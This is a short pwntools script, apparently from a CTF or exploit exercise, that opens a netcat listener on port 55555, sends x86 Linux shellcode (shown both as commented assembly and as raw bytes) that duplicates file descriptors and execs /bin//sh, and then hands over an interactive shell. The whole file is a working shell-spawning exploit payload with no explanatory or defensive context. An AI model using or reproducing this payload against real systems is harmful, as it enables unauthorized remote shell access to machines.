from pwn import * 

p = process(["nc", "-lnvp", "55555"]) 

p.recv() 

# shellcode = """
#     xor ebx, ebx 
#     xor ecx, ecx 
#     inc ecx 
#     push 0x3f
#     pop eax 
#     int 0x80

#     inc ecx 
#     mov al, 0x3f
#     int 0x80 

#     mov	al, 0x0b	
#     push	edx		
#     push	0x68732f2f	
#     push	0x6e69622f	
#     mov	ebx, esp	
#     mov	ecx, edx	
#     int	0x80		
# """
shellcode = "\x31\xDB\x31\xC9\x41\x6A\x3F\x58\xCD\x80\x41\xB0\x3F\xCD\x80\xB0\x0B\x31\xD2\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xD1\xCD\x80"



p.sendline(shellcode)
p.interactive()
